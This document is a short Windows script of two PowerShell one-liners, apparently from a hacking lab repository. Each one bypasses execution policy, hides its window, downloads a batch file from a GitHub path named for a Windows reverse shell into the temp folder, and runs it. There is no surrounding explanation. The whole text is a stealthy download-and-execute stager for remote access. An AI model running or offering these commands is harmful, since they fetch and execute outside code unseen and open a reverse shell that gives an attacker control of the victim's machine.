powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/ItsSebis/HackLab/main/WindowsReverseShell/script.bat',"$env:TMP/daten.bat");& $Env:TMP/daten.bat
pause
powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/ItsSebis/HackLab/main/WindowsReverseShell/spawn.bat',"$env:TMP/daten.bat");& $Env:TMP/daten.bat
pause
